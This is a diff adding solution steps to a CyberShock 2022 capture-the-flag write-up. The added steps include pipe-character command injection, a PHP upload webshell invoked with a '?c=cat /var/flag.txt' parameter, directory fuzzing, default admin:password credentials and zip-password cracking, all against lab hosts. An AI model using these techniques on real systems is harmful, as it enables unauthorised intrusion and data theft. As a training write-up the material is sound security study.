@@ -306,6 +306,18 @@ Port: 2333
 The answer can be found in the /etc/apt/ folder
 ```
 
+##### Solution
+
+Solution here was to notice error when passing `|` character and after `|` character you can inject your shell payload.
+
+##### Steps
+
+1. NC into server `nc -nv 10.93.26.3 2333`
+2. After trying verious payloads notice that when passing `|` gives us error `Fridge is self-aware! Error: 0x0 dumping stack trace: ' .  . '`
+3. Search for files in /etc/apt folder `| ls -a /etc/apt` shows as file `.flag.txt`
+4. Final payload `| cat /etc/apt/.flag.txt` gives us flag: `Flag: ctf-tech{2deb997d-1f67}`
+![Fridge payload](../../images/cybershock-2022-fridge.png){: .image-process-crisp}
+
 #### MAILBOX
 
 ```md
@@ -643,6 +655,30 @@ Username: sysadmin
 Password: Cool2Pass
 ```
 
+##### Solution
+
+Solution here was to harden ssh login, disable root login & disable password login for this server.
+
+##### Steps
+
+1. SSH into server `ssh -i id_rsa sysadmin@env263.target02 -p 2224`
+2. `nano /etc/ssh/sshd_config` and add at end of file 
+```
+PasswordAuthentication no
+UsePAM no
+PermitRootLogin no
+PermitRootLogin prohibit-password
+```
+and restart server `/etc/init.d/ssh reload`
+3. Add public key as authroized key.
+```
+mkdir -p ~/.ssh && touch ~/.ssh/authorized_keys
+chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
+nano .ssh/authorized_keys 
+```
+4. Then we made sure that we can't login as root & with password, submitted for assessment & it's done.
+
+
 #### NEXIF
 
 ```md
@@ -684,6 +720,19 @@ Username: jack
 Password: autonomous1337vehicles
 ```
 
+##### Solution
+
+Solution here was look for active running processes and one of processes contained flag, but this may not be intended path to solve this.
+
+##### Steps
+
+1. SSH into server `ssh jack@env263.target03 -p2222`
+2. `ps aux` shows interesting running processes
+   ![ps aux results](../../images/cybershock-2022-self-driving-car-1.png){: .image-process-crisp}
+3. CD into folder & cat autonomous_shuttle_statushandler.py gives us flag.
+   ![content of autonomous_shuttle_statushandler.py](../../images/cybershock-2022-self-driving-car-2.png){: .image-process-crisp}
+
+
 #### BUS STOP
 
 ```md
@@ -717,6 +766,19 @@ Find a vulnerability in the city guide application and for POC, read the flag fr
 
 <http://env263.target03:8111/>
 ```
+
+##### Solution
+
+Solution here was to upload PHP file & get RCE & read /var/flag.txt content
+
+##### Steps
+
+1. Notice in HTML content commented out path `<!-- <a href="/smartupload">Update logo</> //disabled no need for logo update -->`
+2. In /smartupload we where able to upload files but where do the go?
+3. After fuzzing `gobuster dir -u http://env263.target03:8111/smartupload/ -w /usr/share/seclists/Discovery/Web-Content/common.txt` we noticed `/smartupload/uploads` folder.
+4. After opening BURP & modifying POST content we can see `?msg=success` redirect location that indicates that our file was uploaded successfully.
+   ![Burp payload for php shell](../../images/cybershock-2022-maps.png){: .image-process-crisp}
+5. As we already know that files go into `/smartupload/uploads` path we go into our url `http://env263.target03:8111/smartupload/uploads/filename2.png?c=cat%20/var/flag.txt` and receive flag `?PNG  Flag: 3760cbd5-d23b-4517-8aee-26f43cb178d4`
 
 #### REGISTRY (UNSOLVED)
 
@@ -806,6 +868,18 @@ Change only these values!
 Submit the new barcode data as an answer.
 ```
 
+##### Solution
+
+Solution here was to understand structure of bar code given in boarding pass & modify it's content.
+
+##### Steps
+
+1. We used online tool https://online-barcode-reader.inliteresearch.com/ to extract current barcode text that was: `M1RAMBO/JOHN        EHKGZFR TLLRIXEE 4253 269Y004D0021`
+2. After searching on internet how the structure of boarding pass tickets are built we managed to understand existing structure https://javadude.wordpress.com/2017/10/07/whats-in-my-boarding-pass-barcode/
+3. We did our modification on barcode text that ended up with: `M1RAMBO/JOHN ECTF123 TAYSYDEE 0777 269Y004D0021`
+
+In our modification: E stands for electronic ticket, CTF123 stands for ticket number, TAY stands for Tartu airport number, SYD stands for Sydnay airport number, EE stands for Nordic airline, 0777 stands for our flight number
+
 #### ATIS
 
 ```md
@@ -866,6 +940,14 @@ Help the data analysts to combine the files back into one file
 Answer is the md5sum of the combined file
 ```
 
+##### Solution
+
+Solution here was to merge two files into one & get md5sum of the file.
+
+##### Steps
+
+1. `paste -d '\n' split1.csv split2.csv | grep . | md5sum` that returned flag `b6b66519836c741847ebc82f72ad45c6`
+
 #### TOP-SECRET
 
 ```md
@@ -925,6 +1007,35 @@ QUESTION
 Investigate if you can still recover some unencrypted files from the system.
 ATC Radar
 ```
+
+##### Solution
+
+Solution here was to notice various paths that requried basic auth header, as investigated further username & password was: admin:password.
+After download /backup file that was .zip file we had to brutal force password for zip file & there was the flag for this task.
+
+##### Steps
+
+1. Search for common directories `ffuf -w /usr/share/wordlists/dirbuster/directories.jbrofuzz -u http://env263.target03:8080/FUZZ`, Notice that directories requires basic auth header.
+
+2. After simply trying admin:password, we managed to see the content of directories, so that was the username & password.
+
+3. `ffuf -w /usr/share/wordlists/dirbuster/directories.jbrofuzz -u http://env263.target03:8080/FUZZ -mc 200 -H "Authorization: Basic YWRtaW46cGFzc3dvcmQ="` returned 
+```
+??                      [Status: 200, Size: 7510, Words: 1852, Lines: 168, Duration: 48ms]
+Admin                   [Status: 200, Size: 321, Words: 22, Lines: 23, Duration: 50ms]
+admin                   [Status: 200, Size: 321, Words: 22, Lines: 23, Duration: 51ms]
+ARCHIVE                 [Status: 200, Size: 321, Words: 22, Lines: 23, Duration: 36ms]
+Archive                 [Status: 200, Size: 321, Words: 22, Lines: 23, Duration: 36ms]
+archive                 [Status: 200, Size: 321, Words: 22, Lines: 23, Duration: 36ms]
+backup                  [Status: 200, Size: 240, Words: 1, Lines: 3, Duration: 36ms]
+Backup                  [Status: 200, Size: 240, Words: 1, Lines: 3, Duration: 36ms]
+database                [Status: 200, Size: 321, Words: 22, Lines: 23, Duration: 44ms]
+Database                [Status: 200, Size: 321, Words: 22, Lines: 23, Duration: 44ms] 
+```
+
+4. Downloading backup file we received backup.zip password protected file.
+5. By brutal forcing `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt "backup.zip"` we found password for file `987654321`
+6. After backup.zip extraction there was flag.txt with content : `ctftech{6b0239c5-23da-4301-b391-99ed9a078fa1}`.
 
 ## Links
 
